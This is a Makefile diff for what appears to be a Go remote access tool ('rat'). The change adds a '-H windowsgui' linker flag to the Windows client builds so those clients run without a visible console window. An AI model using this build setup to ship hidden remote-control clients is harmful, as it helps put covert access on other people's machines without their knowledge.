@@ -1,5 +1,6 @@
 BUILD=go build
 PROD=go build -ldflags="-w -s" --tags="prod"
+PROD_WIN32=go build -ldflags="-w -s -H windowsgui" --tags="prod"
 LIB=command/web/static/lib.js
 
 default: web
@@ -20,8 +21,8 @@ prod: web ugly
 	cd command && $(PROD) -o ../rat
 
 windows: prod
-	cd client && GOOS=windows GOARCH=amd64 $(PROD) -o ../command/bin/windows_amd64.exe
-	cd client && GOOS=windows GOARCH=386 $(PROD) -o ../command/bin/windows_x86.exe
+	cd client && GOOS=windows GOARCH=amd64 $(PROD_WIN32) -o ../command/bin/windows_amd64.exe
+	cd client && GOOS=windows GOARCH=386 $(PROD_WIN32) -o ../command/bin/windows_x86.exe
 
 macos: prod
 	cd client && GOOS=darwin GOARCH=amd64 $(PROD) -o ../command/bin/macos_amd64
